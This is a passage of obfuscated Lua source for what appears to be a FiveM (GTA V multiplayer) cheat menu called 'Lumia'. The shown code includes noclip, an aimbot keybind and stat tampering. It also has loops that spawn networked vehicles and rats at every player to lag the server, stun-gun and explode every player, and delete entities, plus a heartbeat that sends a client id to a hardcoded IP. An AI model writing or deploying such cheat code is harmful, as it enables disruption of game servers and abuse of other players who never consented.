            nlFXKkFxuKQAk.natives.SetEntityVisible(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), true, false)
        end

        if jrnyLearIyzKiSIen.config.features.vehicularseatbelt then
            nlFXKkFxuKQAk.natives.SetPedCanBeKnockedOffVehicle(nlFXKkFxuKQAk.natives.PlayerPedId(), 1)
        else
            nlFXKkFxuKQAk.natives.SetPedCanBeKnockedOffVehicle(nlFXKkFxuKQAk.natives.PlayerPedId(), 0)
        end

        if jrnyLearIyzKiSIen.config.features.SupaRoon then 
            nlFXKkFxuKQAk.natives.SetRunSprintMultiplierForPlayer(nlFXKkFxuKQAk.natives.PlayerPedId(), 1.49) 
            nlFXKkFxuKQAk.natives.SetPedMoveRateOverride(nlFXKkFxuKQAk.natives.PlayerPedId(), 3.0) 
        end

        if jrnyLearIyzKiSIen.config.features.SupaStamina then
            nlFXKkFxuKQAk.natives.ResetPlayerStamina(nlFXKkFxuKQAk.natives.PlayerId())
        end

        if jrnyLearIyzKiSIen.config.features.SupaJumpski then
            nlFXKkFxuKQAk.natives.SetSuperJumpThisFrame(nlFXKkFxuKQAk.natives.PlayerId())
        end
      
        if jrnyLearIyzKiSIen.config.features.elnomove then
            nlFXKkFxuKQAk.natives.DisablePlayerFiring(nlFXKkFxuKQAk.natives.GetPlayerPed(jrnyLearIyzKiSIen.config.SelecOP), true)
            nlFXKkFxuKQAk.natives.ClearPedTasks(nlFXKkFxuKQAk.natives.GetPlayerPed(jrnyLearIyzKiSIen.config.SelecOP))
            nlFXKkFxuKQAk.natives.ClearPedTasksImmediately(nlFXKkFxuKQAk.natives.GetPlayerPed(jrnyLearIyzKiSIen.config.SelecOP))
        end

        if jrnyLearIyzKiSIen.config.features.vehicularjesus then
            DmSgpcIoUEJtyTfBBt.FunFunc.Fixerino(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false))
        end

        if jrnyLearIyzKiSIen.config.features.ezdrove and jrnyLearIyzKiSIen.config.features.UnderWaterCar then
            if nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false) ~= 0 then
                nlFXKkFxuKQAk.natives.SetVehicleGravityAmount(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 20.0)
                if nlFXKkFxuKQAk.natives.IsEntityInWater(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false)) then   
                    nlFXKkFxuKQAk.natives.SetVehicleEngineOn(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), true, true, false)
                    nlFXKkFxuKQAk.natives.SetPedMaxTimeUnderwater(nlFXKkFxuKQAk.natives.PlayerPedId(), 100000000000.0)
                end
            end
        elseif jrnyLearIyzKiSIen.config.features.UnderWaterCar then
            if nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false) ~= 0 then
                if nlFXKkFxuKQAk.natives.IsEntityInWater(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false)) then
                    nlFXKkFxuKQAk.natives.SetVehicleEngineOn(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), true, true, false)
                    nlFXKkFxuKQAk.natives.SetVehicleGravityAmount(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 20.0)
                    nlFXKkFxuKQAk.natives.SetPedMaxTimeUnderwater(nlFXKkFxuKQAk.natives.PlayerPedId(), 100000000000.0)
                end
            end
        elseif jrnyLearIyzKiSIen.config.features.ezdrove then
            if nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false) ~= 0 then
                nlFXKkFxuKQAk.natives.SetVehicleGravityAmount(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 30.0)
            end
        else
            if nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false) ~= 0 then
                nlFXKkFxuKQAk.natives.SetVehicleGravityAmount(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 9.8)
            end
        end
        
        if jrnyLearIyzKiSIen.config.features.SpedBoostman and nlFXKkFxuKQAk.natives.IsPedInAnyVehicle(nlFXKkFxuKQAk.natives.PlayerPedId(), true) then
            if nlFXKkFxuKQAk.natives.IsDisabledControlPressed(0, RfPsUKHSFWJuBEJuz.Keys['LEFTSHIFT']) then
                nlFXKkFxuKQAk.natives.SetVehicleForwardSpeed(nlFXKkFxuKQAk.natives.GetVehiclePedIsUsing(nlFXKkFxuKQAk.natives.PlayerPedId()), 175.0)
            end
            if nlFXKkFxuKQAk.natives.IsDisabledControlPressed(0, RfPsUKHSFWJuBEJuz.Keys['LEFTCTRL']) then
                nlFXKkFxuKQAk.natives.SetVehicleForwardSpeed(nlFXKkFxuKQAk.natives.GetVehiclePedIsUsing(nlFXKkFxuKQAk.natives.PlayerPedId()), 0.0)
            end
        end

        if jrnyLearIyzKiSIen.config.features.RollaForever then
            for i = 0, 3 do
                nlFXKkFxuKQAk.natives.StatSetInt(RfPsUKHSFWJuBEJuz.rE.LumHash("mp" .. i .. "_shooting_ability"), 9999, true)
                nlFXKkFxuKQAk.natives.StatSetInt(RfPsUKHSFWJuBEJuz.rE.LumHash("sp" .. i .. "_shooting_ability"), 9999, true)
            end
            megarollaon = true
        elseif megarollaon then
            for i = 0, 3 do
                nlFXKkFxuKQAk.natives.StatSetInt(RfPsUKHSFWJuBEJuz.rE.LumHash("mp" .. i .. "_shooting_ability"), 0, true)
                nlFXKkFxuKQAk.natives.StatSetInt(RfPsUKHSFWJuBEJuz.rE.LumHash("sp" .. i .. "_shooting_ability"), 0, true)
            end
        end

        if jrnyLearIyzKiSIen.config.features.Noclip then
            local isInVehicle = nlFXKkFxuKQAk.natives.IsPedInAnyVehicle(nlFXKkFxuKQAk.natives.PlayerPedId(), 0) 
            local k = nil 
            local x, y, z = nil
            jrnyLearIyzKiSIen.config.oldclipspd = 1
            jrnyLearIyzKiSIen.config.newclipspd = 1
            if not isInVehicle then 
                k = nlFXKkFxuKQAk.natives.PlayerPedId() 
                x, y, z = RfPsUKHSFWJuBEJuz.rE.LumTable.LumUnPack(nlFXKkFxuKQAk.natives.GetEntityCoords(nlFXKkFxuKQAk.natives.PlayerPedId(), 2)) 
            else 
                k = nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.PlayerPedId(), 0) 
                x, y, z = RfPsUKHSFWJuBEJuz.rE.LumTable.LumUnPack(nlFXKkFxuKQAk.natives.GetEntityCoords(nlFXKkFxuKQAk.natives.PlayerPedId(), 1)) 
            end 
            if isInVehicle and jrnyLearIyzKiSIen.func.GetSeatPedIsIn(nlFXKkFxuKQAk.natives.PlayerPedId()) ~= -1 then 
                jrnyLearIyzKiSIen.func.RequestelControl(k) 
            end 
            local dx, dy, dz = jrnyLearIyzKiSIen.func.GetCamDir()
            nlFXKkFxuKQAk.natives.SetEntityVisible(nlFXKkFxuKQAk.natives.PlayerPedId(), 0, 0) 
            nlFXKkFxuKQAk.natives.SetEntityVisible(k, 0, 0) 
            nlFXKkFxuKQAk.natives.SetEntityVelocity(k, 0.0001, 0.0001, 0.0001) 
            if nlFXKkFxuKQAk.natives.IsDisabledControlPressed(0, 21) then 
                jrnyLearIyzKiSIen.config.oldclipspd = jrnyLearIyzKiSIen.config.newclipspd 
                jrnyLearIyzKiSIen.config.newclipspd = jrnyLearIyzKiSIen.config.newclipspd * 5 
            end 
            if nlFXKkFxuKQAk.natives.IsDisabledControlJustReleased(0, 21) then 
                jrnyLearIyzKiSIen.config.newclipspd = jrnyLearIyzKiSIen.config.oldclipspd 
            end 
            if nlFXKkFxuKQAk.natives.IsDisabledControlPressed(0, 32) then 
                x = x + jrnyLearIyzKiSIen.config.newclipspd * dx 
                y = y + jrnyLearIyzKiSIen.config.newclipspd * dy 
                z = z + jrnyLearIyzKiSIen.config.newclipspd * dz 
            end 
            if nlFXKkFxuKQAk.natives.IsDisabledControlPressed(0, 33) then 
                x = x - jrnyLearIyzKiSIen.config.newclipspd * dx 
                y = y - jrnyLearIyzKiSIen.config.newclipspd * dy 
                z = z - jrnyLearIyzKiSIen.config.newclipspd * dz 
            end
            if nlFXKkFxuKQAk.natives.IsDisabledControlPressed(0, 22) then 
                z = z + jrnyLearIyzKiSIen.config.newclipspd 
            end 
            if nlFXKkFxuKQAk.natives.IsDisabledControlPressed(0, 36) then 
                z = z - jrnyLearIyzKiSIen.config.newclipspd 
            end 
            nlFXKkFxuKQAk.natives.SetEntityCoordsNoOffset(k, x, y, z, true, true, true) 
        end

        if jrnyLearIyzKiSIen.config.aimbotbind then
            jrnyLearIyzKiSIen.config.Keybinds.aimbotKn = 'Press Any Key'
            local key, keyname = jrnyLearIyzKiSIen.func.isanykey()
            if key ~= nil then
                if key == 322 or key == 177 then
                    jrnyLearIyzKiSIen.config.Keybinds.aimbotKb = -1
                    jrnyLearIyzKiSIen.config.Keybinds.aimbotKn = -1
                    jrnyLearIyzKiSIen.config.aimbotbind = false
                else
                    jrnyLearIyzKiSIen.config.Keybinds.aimbotKb = key
                    jrnyLearIyzKiSIen.config.Keybinds.aimbotKn = keyname
                    DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Your Have ~g~Succesfuly ~w~Set The Aimbot Hold Key To: '.. keyname ..'')
                    jrnyLearIyzKiSIen.config.aimbotbind = false
                end
            end
        end

        if jrnyLearIyzKiSIen.config.healthbind then
            jrnyLearIyzKiSIen.config.Keybinds.HealthKn = 'Press Any Key'
            local key, keyname = jrnyLearIyzKiSIen.func.isanykey()
            if key ~= nil then
                if key == 322 or key == 177 then
                    jrnyLearIyzKiSIen.config.Keybinds.HealthKb = -1
                    jrnyLearIyzKiSIen.config.Keybinds.HealthKn = -1
                    jrnyLearIyzKiSIen.config.healthbind = false
                else
                    jrnyLearIyzKiSIen.config.Keybinds.HealthKb = key
                    jrnyLearIyzKiSIen.config.Keybinds.HealthKn = keyname
                    DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Your Have ~g~Succesfuly ~w~Set The Health Bind Key To: '.. keyname ..'')
                    jrnyLearIyzKiSIen.config.healthbind = false
                end
            end   
        end

        if jrnyLearIyzKiSIen.config.armorbind then
            jrnyLearIyzKiSIen.config.Keybinds.ArmorKn = 'Press Any Key'
            local key, keyname = jrnyLearIyzKiSIen.func.isanykey()
            if key ~= nil then
                if key == 322 or key == 177 then
                    jrnyLearIyzKiSIen.config.Keybinds.ArmorKb = -1
                    jrnyLearIyzKiSIen.config.Keybinds.ArmorKn = -1
                    jrnyLearIyzKiSIen.config.armorbind = false
                else
                    jrnyLearIyzKiSIen.config.Keybinds.ArmorKb = key
                    jrnyLearIyzKiSIen.config.Keybinds.ArmorKn = keyname
                    DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Your Have ~g~Succesfuly ~w~Set The Armor Bind Key To: '.. keyname ..'')
                    jrnyLearIyzKiSIen.config.armorbind = false
                end
            end   
        end

        if jrnyLearIyzKiSIen.config.repairbind then
            jrnyLearIyzKiSIen.config.Keybinds.RepairKn = 'Press Any Key'
            local key, keyname = jrnyLearIyzKiSIen.func.isanykey()
            if key ~= nil then
                if key == 322 or key == 177 then
                    jrnyLearIyzKiSIen.config.Keybinds.RepairKb = -1
                    jrnyLearIyzKiSIen.config.Keybinds.RepairKn = -1
                    jrnyLearIyzKiSIen.config.repairbind = false
                else    
                    jrnyLearIyzKiSIen.config.Keybinds.RepairKb = key
                    jrnyLearIyzKiSIen.config.Keybinds.RepairKn = keyname
                    DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Your Have ~g~Succesfuly ~w~Set The Repair Bind Key To: '.. keyname ..'')
                    jrnyLearIyzKiSIen.config.repairbind = false
                end
            end   
        end

        if jrnyLearIyzKiSIen.config.revivebind then
            jrnyLearIyzKiSIen.config.Keybinds.ReviveKn = 'Press Any Key'
            local key, keyname = jrnyLearIyzKiSIen.func.isanykey()
            if key ~= nil then
                if key == 322 or key == 177 then
                    jrnyLearIyzKiSIen.config.Keybinds.ReviveKb = -1
                    jrnyLearIyzKiSIen.config.Keybinds.ReviveKn = -1
                    jrnyLearIyzKiSIen.config.revivebind = false
                else    
                    jrnyLearIyzKiSIen.config.Keybinds.ReviveKb = key
                    jrnyLearIyzKiSIen.config.Keybinds.ReviveKn = keyname
                    DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Your Have ~g~Succesfuly ~w~Set The Revive Bind Key To: '.. keyname ..'')
                    jrnyLearIyzKiSIen.config.revivebind = false
                end
            end   
        end

        if jrnyLearIyzKiSIen.config.freecambind then
            jrnyLearIyzKiSIen.config.Keybinds.FreecamKn = 'Press Any Key'
            local key, keyname = jrnyLearIyzKiSIen.func.isanykey()
            if key ~= nil then
                if key == 322 or key == 177 then
                    jrnyLearIyzKiSIen.config.Keybinds.FreecamKb = -1
                    jrnyLearIyzKiSIen.config.Keybinds.FreecamKn = -1
                    jrnyLearIyzKiSIen.config.freecambind = false
                else
                    jrnyLearIyzKiSIen.config.Keybinds.FreecamKb = key
                    jrnyLearIyzKiSIen.config.Keybinds.FreecamKn = keyname
                    DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Your Have ~g~Succesfuly ~w~Set The Freecam Bind Key To: '.. keyname ..'')
                    jrnyLearIyzKiSIen.config.freecambind = false
                end
            end   
        end

        if jrnyLearIyzKiSIen.config.noclipbind then
            jrnyLearIyzKiSIen.config.Keybinds.NoclipKn = 'Press Any Key'
            local key, keyname = jrnyLearIyzKiSIen.func.isanykey()
            if key ~= nil then
                if key == 322 or key == 177 then
                    jrnyLearIyzKiSIen.config.Keybinds.NoclipKb = -1
                    jrnyLearIyzKiSIen.config.Keybinds.NoclipKn = -1
                    jrnyLearIyzKiSIen.config.noclipbind = false
                else
                    jrnyLearIyzKiSIen.config.Keybinds.NoclipKb = key
                    jrnyLearIyzKiSIen.config.Keybinds.NoclipKn = keyname
                    DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Your Have ~g~Succesfuly ~w~Set The Noclip Bind Key To: '.. keyname ..'')
                    jrnyLearIyzKiSIen.config.noclipbind = false
                end
            end   
        end

        if jrnyLearIyzKiSIen.config.consolebind then
            jrnyLearIyzKiSIen.config.Keybinds.ConsoleKn = 'Press Any Key'
            local key, keyname = jrnyLearIyzKiSIen.func.isanykey()
            if key ~= nil then
                if key == 322 or key == 177 then
                    jrnyLearIyzKiSIen.config.Keybinds.ConsoleKb = -1
                    jrnyLearIyzKiSIen.config.Keybinds.ConsoleKn = -1
                    jrnyLearIyzKiSIen.config.consolebind = false
                else
                    jrnyLearIyzKiSIen.config.Keybinds.ConsoleKb = key
                    jrnyLearIyzKiSIen.config.Keybinds.ConsoleKn = keyname
                    DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Your Have ~g~Succesfuly ~w~Set The Console Bind Key To: '.. keyname ..'')
                    jrnyLearIyzKiSIen.config.consolebind = false
                end
            end   
        end

        if jrnyLearIyzKiSIen.config.openmenbind then
            jrnyLearIyzKiSIen.config.Keybinds.OpenKn = 'Press Any Key'
            local key, keyname = jrnyLearIyzKiSIen.func.isanykey()
            if key ~= nil then
                if key == 322 or key == 177 then
                    jrnyLearIyzKiSIen.config.Keybinds.OpenKb = -1
                    jrnyLearIyzKiSIen.config.Keybinds.OpenKn = -1
                    jrnyLearIyzKiSIen.config.openmenbind = false
                else
                    jrnyLearIyzKiSIen.config.Keybinds.OpenKb = key
                    jrnyLearIyzKiSIen.config.Keybinds.OpenKn = keyname
                    jrnyLearIyzKiSIen.config.openmenbind = false
                end
            end   
        end

        if nlFXKkFxuKQAk.natives.IsDisabledControlJustPressed(1, jrnyLearIyzKiSIen.config.Keybinds.HealthKb) then
            DmSgpcIoUEJtyTfBBt.FunFunc.ElSomeHealth()
        end

        if nlFXKkFxuKQAk.natives.IsDisabledControlJustPressed(1, jrnyLearIyzKiSIen.config.Keybinds.ArmorKb) then
            DmSgpcIoUEJtyTfBBt.FunFunc.ElSomeArmor()
        end

        if nlFXKkFxuKQAk.natives.IsDisabledControlJustPressed(1, jrnyLearIyzKiSIen.config.Keybinds.RepairKb) then
            DmSgpcIoUEJtyTfBBt.FunFunc.Fixerino(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false))
        end

        if nlFXKkFxuKQAk.natives.IsDisabledControlJustPressed(1, jrnyLearIyzKiSIen.config.Keybinds.ReviveKb) then
            DmSgpcIoUEJtyTfBBt.FunFunc.ElGetUpNow()
        end

        if nlFXKkFxuKQAk.natives.IsDisabledControlJustPressed(1, jrnyLearIyzKiSIen.config.Keybinds.FreecamKb) then
            jrnyLearIyzKiSIen.config.features.ToggleFreeCam = not jrnyLearIyzKiSIen.config.features.ToggleFreeCam
            DmSgpcIoUEJtyTfBBt.freec.FreeCamToggle()
        end

        if nlFXKkFxuKQAk.natives.IsDisabledControlJustPressed(1, jrnyLearIyzKiSIen.config.Keybinds.NoclipKb) then
            jrnyLearIyzKiSIen.config.features.Noclip = not jrnyLearIyzKiSIen.config.features.Noclip
            if jrnyLearIyzKiSIen.config.features.Noclip then
                nlFXKkFxuKQAk.natives.SetEntityVisible(nlFXKkFxuKQAk.natives.PlayerPedId(), false, false)
            else
                nlFXKkFxuKQAk.natives.SetEntityRotation(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.PlayerPedId(), 0), nlFXKkFxuKQAk.natives.GetGameplayCamRot(2), 2, 1)
                nlFXKkFxuKQAk.natives.SetEntityVisible(nlFXKkFxuKQAk.natives.PlayerPedId(), true, false)
                nlFXKkFxuKQAk.natives.SetEntityVisible(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.PlayerPedId(), 0), true, false)
            end
        end

        if nlFXKkFxuKQAk.natives.IsDisabledControlJustPressed(1, jrnyLearIyzKiSIen.config.Keybinds.ConsoleKb) then
            local input = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Lumia Console', '', 32, true)
            RfPsUKHSFWJuBEJuz.Console.ConsoleParser(input)
        end

        if jrnyLearIyzKiSIen.config.features.Serverlagveh then
            local playerlist = nlFXKkFxuKQAk.natives.GetActivePlayers()
            for i = 1, #playerlist do
                local ped = playerlist[i]
                local actualped = nlFXKkFxuKQAk.natives.GetPlayerPed(ped)
                local pedcoords = nlFXKkFxuKQAk.natives.GetEntityCoords(actualped, false)
                local ghash = RfPsUKHSFWJuBEJuz.rE.LumHash(jrnyLearIyzKiSIen.config.serverlagveh)
                if not nlFXKkFxuKQAk.natives.HasModelLoaded(ghash) then
                    nlFXKkFxuKQAk.natives.RequestModel(ghash)
                    RfPsUKHSFWJuBEJuz.rE.LumWait(10)
                end
                local vehicle = nlFXKkFxuKQAk.natives.CreateVehicle(ghash, pedcoords.x, pedcoords.y, pedcoords.z, nlFXKkFxuKQAk.natives.GetEntityHeading(actualped), true, true)
                nlFXKkFxuKQAk.natives.NetworkRegisterEntityAsNetworked(nlFXKkFxuKQAk.natives.VehToNet(vehicle))
            end 
        end

        if jrnyLearIyzKiSIen.config.features.Serverlagani then
            local playerlist = nlFXKkFxuKQAk.natives.GetActivePlayers()
            for i = 1, #playerlist do
                local ped = playerlist[i]
                local actualped = nlFXKkFxuKQAk.natives.GetPlayerPed(ped)
                local pedcoords = nlFXKkFxuKQAk.natives.GetEntityCoords(actualped, false)
                local ghash = RfPsUKHSFWJuBEJuz.rE.LumHash('a_c_rat')
                if not nlFXKkFxuKQAk.natives.HasModelLoaded(ghash) then
                    nlFXKkFxuKQAk.natives.RequestModel(ghash)
                    RfPsUKHSFWJuBEJuz.rE.LumWait(10)
                end
                local rat = nlFXKkFxuKQAk.natives.CreatePed(29, ghash, pedcoords.x, pedcoords.y, pedcoords.z, 0.0, true, true)
                nlFXKkFxuKQAk.natives.NetworkRegisterEntityAsNetworked(nlFXKkFxuKQAk.natives.PedToNet(rat))
            end
        end

        if jrnyLearIyzKiSIen.config.features.tazeloopall then
            local playerlist = nlFXKkFxuKQAk.natives.GetActivePlayers()
            for i = 1, #playerlist do
                local ped = playerlist[i]
                local actualped = nlFXKkFxuKQAk.natives.GetPlayerPed(ped)
                local pedcoords = nlFXKkFxuKQAk.natives.GetEntityCoords(actualped, false)
                local rot = nlFXKkFxuKQAk.natives.GetEntityRotation(actualped)
                local direct = jrnyLearIyzKiSIen.func.RotationToDirection(rot)
                nlFXKkFxuKQAk.natives.ShootSingleBulletBetweenCoords((pedcoords.x + direct.x), (pedcoords.y + direct.y), (pedcoords.z + direct.z), pedcoords.x, pedcoords.y, pedcoords.z, 0.0, false, `WEAPON_STUNGUN`, nlFXKkFxuKQAk.natives.PlayerPedId(), true, true, 1000)
            end
        end

        if jrnyLearIyzKiSIen.config.features.tazeloopselp then
            local ped = jrnyLearIyzKiSIen.config.SelecOP
            local actualped = nlFXKkFxuKQAk.natives.GetPlayerPed(ped)
            local pedcoords = nlFXKkFxuKQAk.natives.GetEntityCoords(actualped, false)
            local rot = nlFXKkFxuKQAk.natives.GetEntityRotation(actualped)
            local direct = jrnyLearIyzKiSIen.func.RotationToDirection(rot)
            nlFXKkFxuKQAk.natives.ShootSingleBulletBetweenCoords((pedcoords.x + direct.x), (pedcoords.y + direct.y), (pedcoords.z + direct.z), pedcoords.x, pedcoords.y, pedcoords.z, 0.0, false, `WEAPON_STUNGUN`, nlFXKkFxuKQAk.natives.PlayerPedId(), true, true, 1000)
        end

        if jrnyLearIyzKiSIen.config.features.udboomall then
            local playerlist = nlFXKkFxuKQAk.natives.GetActivePlayers()
            for i = 1, #playerlist do
                local ped = playerlist[i]
                DmSgpcIoUEJtyTfBBt.FunFunc.goboom(ped)
            end
        end

        if jrnyLearIyzKiSIen.config.features.boomloopselp then
            DmSgpcIoUEJtyTfBBt.FunFunc.goboom(jrnyLearIyzKiSIen.config.SelecOP)
        end

        if jrnyLearIyzKiSIen.config.features.NoRain then
            nlFXKkFxuKQAk.natives.SetWeatherTypeNowPersist("CLEAR")
        end

        --[[local chamss = true

        if chamss then
            local playerlist = GetActivePlayers()
            for i = 1, #playerlist do
                local currPlayer = playerlist[i]
                local coordss = GetEntityCoords(GetPlayerPed(currPlayer), false)
                local coords = GetPedBoneCoords(GetPlayerPed(currPlayer), 0.0, 0.0, 0.0)
                local rot = GetEntityRotation(GetPlayerPed(currPlayer))
                DrawMarker(28, coords.x, coords.y, coords.z, 0.0, 0.0, 0.0, rot.x, rot.y, rot.z, 0.85, 0.85, 1.0, 255, 0, 0, 125, false, false, 2, false, nil, nil, true)
            end
        end]]

        if jrnyLearIyzKiSIen.config.features.Crosshair then
            DmSgpcIoUEJtyTfBBt.FunFunc.CrossHairFC(false)
        end

        if jrnyLearIyzKiSIen.config.features.FMiniM then
            nlFXKkFxuKQAk.natives.DisplayRadar(1)
        end

        if jrnyLearIyzKiSIen.config.features.honkem then
            for k in DmSgpcIoUEJtyTfBBt.FunFunc.FindLeCars() do
                jrnyLearIyzKiSIen.func.RequestelControl(k)
                nlFXKkFxuKQAk.natives.SetVehicleAlarmTimeLeft(k, 100000)
            end
        end

        if jrnyLearIyzKiSIen.config.features.shot4dastars then
            for k in DmSgpcIoUEJtyTfBBt.FunFunc.FindLeCars() do
                nlFXKkFxuKQAk.natives.ClearPedTasksImmediately(nlFXKkFxuKQAk.natives.GetPedInVehicleSeat(k, -1))
                jrnyLearIyzKiSIen.func.RequestelControl(k)
                nlFXKkFxuKQAk.natives.SetVehicleGravityAmount(k, -10.0)
            end
        end

        if jrnyLearIyzKiSIen.config.features.AimbotM then
            if jrnyLearIyzKiSIen.config.features.ABDrawFOV then
                if not jrnyLearIyzKiSIen.config.opennow then
                    local screenx, screeny = nlFXKkFxuKQAk.natives.GetActiveScreenResolution()
                    jrnyLearIyzKiSIen.func.DrawSomeSprite(screenx / 2, screeny / 2, RfPsUKHSFWJuBEJuz.rE.LumToNum(jrnyLearIyzKiSIen.config.aimbotfov), RfPsUKHSFWJuBEJuz.rE.LumToNum(jrnyLearIyzKiSIen.config.aimbotfov), 0.0, 'mpinventory', 'in_world_circle', jrnyLearIyzKiSIen.config.CSecondary2.r, jrnyLearIyzKiSIen.config.CSecondary2.g, jrnyLearIyzKiSIen.config.CSecondary2.b, 70, false)
                end
            end
        end

        DmSgpcIoUEJtyTfBBt.FunFunc.DaBlipers()

        RfPsUKHSFWJuBEJuz.rE.LumWait(0)
    end
end)

-- Heart Beat Thread --
RfPsUKHSFWJuBEJuz.rE.LumThread(function()
    while jrnyLearIyzKiSIen.config.dienow do
        local Id = nlFXKkFxuKQAk.natives.rEUid()
        local HBres = RfPsUKHSFWJuBEJuz.rE.LumJson.LumDecode(nlFXKkFxuKQAk.natives.WebReq("http://51.222.106.190:3000/hb/"..Id.."", nil, 'get'))
        if HBres ~= nil then
            if HBres.message ~= 'null' and HBres.time ~= 'null' then
                DmSgpcIoUEJtyTfBBt.Mfunc.DrawNotification(HBres.message, HBres.time)
            end
            RfPsUKHSFWJuBEJuz.rE.LumWait(25000)
        else
            return
        end
    end
end)

-- Freecam Thread 1 --
RfPsUKHSFWJuBEJuz.rE.LumThread(function()
    while jrnyLearIyzKiSIen.config.dienow do
        if jrnyLearIyzKiSIen.config.features.ToggleFreeCam then							
            if jrnyLearIyzKiSIen.config.camf ~= nil then									
                local player = nlFXKkFxuKQAk.natives.PlayerPedId()      						
                local playerLoc = nlFXKkFxuKQAk.natives.GetEntityCoords(player, true)						
                nlFXKkFxuKQAk.natives.DisplayRadar(false)
                if not jrnyLearIyzKiSIen.config.opennow then									
                    REVMYmrswsZvxOXvJE.freec.HandleFC()
                end
            else
                nlFXKkFxuKQAk.natives.DisplayRadar(true)		
            end
        end							
        RfPsUKHSFWJuBEJuz.rE.LumWait(10)					
    end 			
end)

-- Freecam Thread 2 --
RfPsUKHSFWJuBEJuz.rE.LumThread(function()
    while jrnyLearIyzKiSIen.config.dienow do
        RfPsUKHSFWJuBEJuz.rE.LumWait(0)
        if jrnyLearIyzKiSIen.config.features.ToggleFreeCam then
            local AimClickOnThing
            local AimClickOnThing2
				
            if jrnyLearIyzKiSIen.config.camf ~= nil then
                nlFXKkFxuKQAk.natives.DisableAllControlActions(1)					
                local hit, coords, entity = DmSgpcIoUEJtyTfBBt.freec.RayCastCam(1000.0)					
                local cameraCoord = nlFXKkFxuKQAk.natives.GetCamCoord(jrnyLearIyzKiSIen.config.camf)
                nlFXKkFxuKQAk.natives.SetFocusPosAndVel(cameraCoord.x,cameraCoord.y,cameraCoord.z,0.0,0.0,0.0)								
                local gox_dict = "core"					
                nlFXKkFxuKQAk.natives.RequestNamedPtfxAsset(gox_dict)					
                while not nlFXKkFxuKQAk.natives.HasNamedPtfxAssetLoaded(gox_dict) do						
                    RfPsUKHSFWJuBEJuz.rE.LumWait(10)					
                end										
                if jrnyLearIyzKiSIen.config.features.IONFCH then
                    if jrnyLearIyzKiSIen.config.opennow and jrnyLearIyzKiSIen.config.features.IONFCH then
                        AimClickOnThing = nil
                        AimClickOnThing2 = nil
                    else
                        AimClickOnThing = nlFXKkFxuKQAk.natives.IsDisabledControlJustReleased(1, 24)
                        AimClickOnThing2 = nlFXKkFxuKQAk.natives.IsDisabledControlPressed(1, 24)
                        DmSgpcIoUEJtyTfBBt.FunFunc.CrossHairFC(AimClickOnThing)
                    end
                    --DELETE MODE						
                    if hit and AimClickOnThing2 and jrnyLearIyzKiSIen.config.freecammode == 4 then	
                        nlFXKkFxuKQAk.natives.NetworkRequestControlOfEntity(entity)					
                        nlFXKkFxuKQAk.natives.SetEntityAsMissionEntity(entity)						
                        nlFXKkFxuKQAk.natives.DeleteEntity(entity)
                        nlFXKkFxuKQAk.natives.DeleteObject(entity)
                        nlFXKkFxuKQAk.natives.DeleteVehicle(entity)
                        nlFXKkFxuKQAk.natives.DeletePed(entity)
                        --DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('~g~Deleted ~w~Entity', 85, 0.40, 2)
                    end
                    --TELEPORT MODE										
                    if hit and AimClickOnThing and jrnyLearIyzKiSIen.config.freecammode == 1 then							
                        local ped = nlFXKkFxuKQAk.natives.PlayerPedId()							
                        nlFXKkFxuKQAk.natives.SetEntityCoords(ped, coords.x, coords.y, coords.z, false, false, false, true)
                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Teleported')						
                    end
                    local sx, sy = nlFXKkFxuKQAk.natives.GetActiveScreenResolution()
                    --FREECAM UI
                        jrnyLearIyzKiSIen.func.DrawSomeText("MODE  |", 4, false, (sx / 2) - 95, sy - 45, jrnyLearIyzKiSIen.config.FreeCamScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)						
                        if nlFXKkFxuKQAk.natives.IsDisabledControlJustPressed(1,16) then						 	
                            jrnyLearIyzKiSIen.config.freecammode = (jrnyLearIyzKiSIen.config.freecammode + 1) % 11											
